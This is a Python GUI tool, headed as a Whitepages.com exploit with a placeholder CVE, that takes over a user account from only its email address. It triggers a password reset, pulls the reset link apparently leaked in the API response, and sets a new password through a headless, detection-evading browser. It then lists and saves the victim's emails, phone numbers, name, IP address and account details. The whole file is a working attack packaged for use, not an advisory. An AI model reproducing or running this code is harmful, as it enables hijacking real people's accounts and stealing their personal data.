# Whitepages.com Vulnerability Exploit by https://t.me/Swezy
# 13. September 2025
# CVE-2025-XXXX 
# Exploit Author: Swezy
# GitHub: https://github.com/SwezyDev

from datetime import datetime, timezone
import undetected_chromedriver as uc
from dateutil import parser
from util import CTkWindow
from PIL import Image
import customtkinter
import threading
import ctypes
import time
import json

def write_status(text):
    status.configure(state="normal")
    status.insert("end", text + "\n")
    status.configure(state="disabled")

def append_log(text):
    logs.configure(state="normal")
    logs.insert("end", text + "\n")
    logs.configure(state="disabled")

def open_link(url):
    webbrowser.open_new(url)


##### Get the CSRF Token for the Password Reset Request #####

GET_CSRF = """
const cb = arguments[arguments.length-1];
fetch('/api/getcsrftoken', { credentials: 'include' })
    .then(async res => {
        const headers = {};
        for (const pair of res.headers.entries()) headers[pair[0]] = pair[1];
        let body;
        try { body = await res.json(); } catch(e) { body = await res.text(); }
        cb({status: res.status, headers: headers, body: body});
    })
    .catch(err => cb({error: String(err)}));
"""

##### Post the Password Reset Request #####

POST_RESET = """
const csrf = arguments[0];
const emailToken = arguments[1];
const newPassword = arguments[2];
const cb = arguments[arguments.length-1];
fetch('/api/auth/reset-password-by-email', {
    method: 'POST', credentials: 'include',
    headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrf},
    body: JSON.stringify({ emailToken: emailToken, newPassword: newPassword })
})
.then(async res => { let text = await res.text(); cb({status: res.status, body: text}); })
.catch(err => cb({error: String(err)}));
"""

##### Helper function to format timestamps #####

def format_time(date_str):
    if not date_str or date_str.lower() == 'none':
        return f"N/A"
    try:
        dt = parser.isoparse(date_str)
        now = datetime.now(timezone.utc)
        diff = now - dt.astimezone(timezone.utc)

        days = diff.days
        seconds = diff.seconds
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60

        if days > 0:
            ago = f"{days} day{'s' if days > 1 else ''} ago"
        elif hours > 0:
            ago = f"{hours} hour{'s' if hours > 1 else ''} ago"
        elif minutes > 0:
            ago = f"{minutes} minute{'s' if minutes > 1 else ''} ago"
        else:
            ago = "just now"

        formatted = dt.strftime("%m-%d-%YT%H-%M-%S")
        return f"{formatted} ({ago})"
    except Exception:
        return date_str


##### Function to reset password using undetected-chromedriver #####

def reset_password(password, reset_url):
    options = uc.ChromeOptions()
    options.add_argument('--headless=new')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')

    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36")

    driver = uc.Chrome(options=options)
    try:
        driver.get(reset_url)
        time.sleep(1.2)

        deadline = time.time() + 30
        fetch_result = None
        while time.time() < deadline:
            fetch_result = driver.execute_async_script(GET_CSRF) # Get CSRF token
            if fetch_result and fetch_result.get('status') == 200:
                break
            time.sleep(0.8)

        if not fetch_result or fetch_result.get('status') != 200:
            return {"error": "getcsrftoken failed"}, 403

        body = fetch_result.get('body')
        csrf = None
        if isinstance(body, dict):
            csrf = body.get('csrfToken') or body.get('token')
        else:
            try:
                p = json.loads(body)
                csrf = p.get('csrfToken') or p.get('token')
            except Exception:
                csrf = str(body).strip()[:200]

        if not csrf:
            return {"error": "csrf not found"}, 403

        res = driver.execute_async_script(POST_RESET, csrf, reset_url.split("/")[-1], password) # Post the reset request
        if res is None:
            return {"error": "reset request returned nothing"}, 403
        if 'error' in res:
            return {"error": res['error']}, 403

        status = res.get('status') 
        body = res.get('body', '') 

        try:
            parsed = json.loads(body)
        except Exception:
            parsed = {"raw": body}

        return parsed, int(status) # Return the parsed JSON and status code

    finally:
        try:
            driver.quit()
        except Exception:
            pass

def exploit(email, password):
    if not email or "@" not in email or "." not in email.split("@")[-1]:
        email_input.configure(border_color="#ff0000")
        return
    
    status.delete("1.0", "end")
    logs.delete("1.0", "end")

    email_input.configure(border_color="#DDDDDD", state="disabled")
    password_input.configure(border_color="#DDDDDD", state="disabled")
    login_button.configure(text="Exploit started...", state="disabled")
    start = time.time()
    write_status("[*] Preparing Exploit Payload...\n")
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'windows','mobile': False})
    write_status("[*] Sending Exploit Payload...")

    res = scraper.post(
        "https://www.whitepages.com/api/auth/trigger-reset-password-email",
        json={"email": email},
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.whitepages.com",
            "Referer": "https://www.whitepages.com/auth/forgot-password"
        },
        timeout=15
    )

    if res.status_code != 202:
        write_status(f"[✘] Failed to send Exploit [{res.status_code}]")
        return

    write_status(f"[+] Exploit Sent Successfully [{res.status_code}]")

    try:
        data = res.json()
    except json.JSONDecodeError:
        data = {}

    attrs = data.get('amplitudeAttributes', {})
    reset_url = attrs.get('password_url')
    if not reset_url:
        write_status("\n[✘] No Password Reset URL found")
        return

    write_status(f"\n[✓] Reset Password URL: {reset_url}")

    write_status("\n[*] Preparing Password Reset Exploit...\n")

    write_status("[*] Sending Password Reset Exploit...")

    reset_json, reset_status = reset_password(password, reset_url)

    if reset_status != 200:
        write_status(f"[✘] Failed to Reset Password [{reset_status}]")
        return
    
    write_status(f"[+] Password Reset Successfully [{reset_status}]")
    write_status(f"\n[✓] New Password: {password}")

    write_status("\n[*] Account Details Found")

    legacy_modal = reset_json.get('legacyModal', 'N/A')
    if legacy_modal == "false":
        legacy_output = False
    elif legacy_modal == "true":
        legacy_output = True
    else:
        legacy_output = legacy_modal

    append_log(f"[✓] Primary Email: {reset_json.get('primaryEmail', 'N/A')}")
    emails_list = reset_json.get("emails", [])
    if emails_list:
        append_log(f"[✓] Associated Emails:")
        for i, e in enumerate(emails_list):
            email_list_x = e.get("email", "N/A")
            id_list_x = e.get("id", "N/A")
            user_id_list_x = e.get("user_id", "N/A")
            created_at_list_x = e.get("created_at", "N/A")
            created_at_list_xx = format_time(created_at_list_x)
            append_log(f"    [-] Email: {email_list_x}")
            append_log(f"    [-] ID: {id_list_x}")
            append_log(f"    [-] User ID: {user_id_list_x}")
            append_log(f"    [-] Created At: {created_at_list_xx}")
            if i < len(emails_list) - 1:
                append_log("    ------------------------------------------------------------")
    else:
        append_log(f"[✓] Associated Emails: N/A")
    append_log(f"[✓] Password: {password}")
    append_log(f"[✓] Name: {reset_json.get('name', 'N/A')}")
    append_log(f"[✓] Full Name: {reset_json.get('firstName', 'N/A')} {reset_json.get('middleName', 'N/A')} {reset_json.get('lastName', 'N/A')}")
    phone_list = reset_json.get("phoneNumbers", [])
    if phone_list:
        append_log(f"[✓] Associated Phone Numbers:")
        for i, e in enumerate(phone_list):
            phone_list_x = e.get("number", "N/A")
            id_list_x = e.get("id", "N/A")
            user_id_list_x = e.get("user_id", "N/A")
            created_at_list_x = e.get("created_at", "N/A")
            created_at_list_xx = format_time(created_at_list_x)
            append_log(f"    [-] Phone Number: {phone_list_x}")
            append_log(f"    [-] ID: {id_list_x}")
            append_log(f"    [-] User ID: {user_id_list_x}")
            append_log(f"    [-] Created At: {created_at_list_xx}")
            if i < len(phone_list) - 1:
                append_log("    ------------------------------------------------------------")
    else:
        append_log(f"[✓] Associated Phone Numbers: N/A")
    append_log(f"[✓] Account ID: {reset_json.get('id', 'N/A')}")
    append_log(f"[✓] IP Address: {reset_json.get('ipAddress', 'N/A')}")
    append_log(f"[✓] User Type: {reset_json.get('userType', 'N/A')}")
    append_log(f"[✓] Login Allowed: {reset_json.get('loginAllowed', 'N/A')}")
    append_log(f"[✓] Membership Type: {reset_json.get('membershipType', 'N/A')}")
    append_log(f"[✓] Business Features Status: {reset_json.get('businessFeaturesStatus', 'N/A')}")
    append_log(f"[✓] Has Business Features: {reset_json.get('hasBusinessFeatures', 'N/A')}")
    append_log(f"[✓] Has Full Property Features: {reset_json.get('hasFullPropertyFeatures', 'N/A')}")
    append_log(f"[✓] Premium Subscriber: {reset_json.get('premiumSubscriber', 'N/A')}")
    created_at_ac = reset_json.get('createdAt', "N/A")
    created_at_ac_x = format_time(created_at_ac)
    append_log(f"[✓] Account Created at: {created_at_ac_x}")
    password_changed_at = reset_json.get('pwdChangedAt', "N/A")
    password_changed_at_x = format_time(password_changed_at)
    append_log(f"[✓] Password Changed at: {password_changed_at_x}")
    subscription_ended_at = reset_json.get('subscriptionEndedAt', "N/A")
    subscription_ended_at_x = format_time(subscription_ended_at)
    append_log(f"[✓] Subscription Ended at: {subscription_ended_at_x}")
    payment_edited_at = reset_json.get('paymentEditedAt', "N/A")
    payment_edited_at_x = format_time(payment_edited_at)
    append_log(f"[✓] Payment Edited at: {payment_edited_at_x}")
    premium_tos_accepted_at = reset_json.get('premiumTosAcceptedAt', "N/A")
    premium_tos_accepted_at_x = format_time(premium_tos_accepted_at)
    append_log(f"[✓] Premium ToS Accepted at: {premium_tos_accepted_at_x}")
    landlord_tos_accepted_at = reset_json.get('landlordTosAcceptedAt', "N/A")
    landlord_tos_accepted_at_x = format_time(landlord_tos_accepted_at)
    append_log(f"[✓] Landlord ToS Accepted at: {landlord_tos_accepted_at_x}")
    append_log(f"[✓] Suspended: {reset_json.get('suspended', 'N/A')}")
    append_log(f"[✓] Disabled: {reset_json.get('disabled', 'N/A')}")
    append_log(f"[✓] Mobile: {reset_json.get('mobile', 'N/A')}")
    append_log(f"[✓] Industry: {reset_json.get('industry', 'N/A')}")
    append_log(f"[✓] Legacy Modal: {legacy_output}")
    append_log(f"[✓] Auto Monitor Disabled: {reset_json.get('autoMonitorDisabled', 'N/A')}")
    append_log(f"[✓] PNP Beta Opt in: {reset_json.get('pnpBetaOptIn', 'N/A')}")

    save_button.configure(state="normal")

    end = time.time()
    write_status(f"\n[$] Total Time Taken: {end - start:.2f}s")

    login_button.configure(text="Start Exploit",state="normal")
    email_input.configure(state="normal")
    password_input.configure(state="normal")
    
def save_logs():
    with open(f"{email_input.get()}_whitepages.txt", "w", encoding="utf-8") as f:
        f.write(logs.get("1.0", "end").strip())
        f.close()

    ctypes.windll.user32.MessageBoxW(0, f"Logs saved as {email_input.get()}_whitepages.txt", "Success", 0x40)
    save_button.configure(state="disabled")

def login():
    global root, logs, status, login_button, email_input, password_input, save_button
    root = CTkWindow(
        app_title="", 
        geometry="1000x800", 
        titlebar_color="#FFFFFF",
        title_color="#FFFFFF",
        fg_color="#FFFFFF",
        x_color="#000000",
        x_hover_color="#e6e6e6",
        resizable=False,
        round_corner=6,
        icon=None,
        justify="left",
        style="modern",        
    )

    hide_dot = customtkinter.CTkLabel(master=root, text="", fg_color="#ffffff", bg_color="#ffffff", height=15, width=15) 
    hide_dot.place(x=940, y=9)

    hide_icon = customtkinter.CTkLabel(master=root, text="", fg_color="#ffffff", bg_color="#ffffff", height=16, width=16) 
    hide_icon.place(x=8.4, y=4.4)

    frame = customtkinter.CTkFrame(master=root, fg_color="#ffffff", bg_color="#ffffff", height=500, width=440 , corner_radius=6, border_width=0.6, border_color="#DDDDDD")
    frame.place(x=50, y=200)

    frame2 = customtkinter.CTkFrame(master=root, fg_color="#ffffff", bg_color="#ffffff", height=500, width=440 , corner_radius=6, border_width=0.6, border_color="#DDDDDD")
    frame2.place(x=500, y=200)

    logo_image = customtkinter.CTkImage(Image.open("assets/logo.png"), size=(250, 70))
    logo_label = customtkinter.CTkLabel(master=root, text="", image=logo_image, fg_color="#ffffff", bg_color="#ffffff")
    logo_label.place(x=370, y=80)

    login_label = customtkinter.CTkLabel(master=frame, text="Exploit Account", fg_color="#ffffff", bg_color="#ffffff", text_color="#000000", font=("Arial Black", 24))
    login_label.place(x=130, y=30)

    email_input = customtkinter.CTkEntry(master=frame, placeholder_text="📧 | E-Mail", width=350, height=40, border_width=1, corner_radius=6, fg_color="#ffffff", border_color="#DDDDDD", text_color="#000000", font=("Arial Black", 14))
    email_input.place(x=45, y=100)

    password_input = customtkinter.CTkEntry(master=frame, placeholder_text="🔒 | New Password", width=350, height=40, border_width=1, corner_radius=6, fg_color="#ffffff", border_color="#DDDDDD", text_color="#000000", font=("Arial Black", 14), show="*")
    password_input.place(x=45, y=160)

    login_button = customtkinter.CTkButton(master=frame, text="Start Exploit", width=350, height=40, border_width=0, corner_radius=6, fg_color="#405fff", hover_color="#2e47d0", text_color="#ffffff", font=("Arial Black", 14), command=lambda: threading.Thread(target=exploit, args=(email_input.get(), password_input.get())).start())
    login_button.place(x=45, y=220)

    status = customtkinter.CTkTextbox(master=frame, width=350, height=170, border_width=1, corner_radius=6, fg_color="#ffffff", border_color="#DDDDDD", text_color="#000000", font=("Arial Black", 14), state="disabled")
    status.place(x=45, y=290)

    password_input.bind("<FocusIn>", lambda event: password_input.configure(border_color="#405fff"))
    password_input.bind("<FocusOut>", lambda event: password_input.configure(border_color="#DDDDDD"))

    email_input.bind("<FocusIn>", lambda event: email_input.configure(border_color="#405fff"))
    email_input.bind("<FocusOut>", lambda event: email_input.configure(border_color="#DDDDDD"))

    info_label = customtkinter.CTkLabel(master=frame2, text="Information", fg_color="#ffffff", bg_color="#ffffff", text_color="#000000", font=("Arial Black", 24))
    info_label.place(x=150, y=30)

    logs = customtkinter.CTkTextbox(master=frame2, width=350, height=300, border_width=1, corner_radius=6, fg_color="#ffffff", border_color="#DDDDDD", text_color="#000000", font=("Arial Black", 14), state="disabled")
    logs.place(x=45, y=100)

    save_button = customtkinter.CTkButton(master=frame2, text="Save Logs", width=350, height=40, border_width=0, corner_radius=6, fg_color="#405fff", hover_color="#2e47d0", text_color="#ffffff", font=("Arial Black", 14), command=lambda: save_logs(), state="disabled")
    save_button.place(x=45, y=420)

    text = customtkinter.CTkLabel(master=root, text="Whitepages.com Vulnerability", fg_color="#ffffff", bg_color="#ffffff", text_color="#000000", font=("Arial Black", 14))
    text.place(x=400, y=725)

    telegram = customtkinter.CTkLabel(master=root, text="Telegram @Swezy", fg_color="#ffffff", bg_color="#ffffff", text_color="#000000", font=("Arial Black", 14))
    telegram.place(x=435, y=750)

    text.bind("<Button-1>", lambda e: open_link("http://www.whitepages.com"))
    telegram.bind("<Button-1>", lambda e: open_link("http://t.me/Swezy"))

    root.mainloop()


if __name__ == "__main__":

    login()
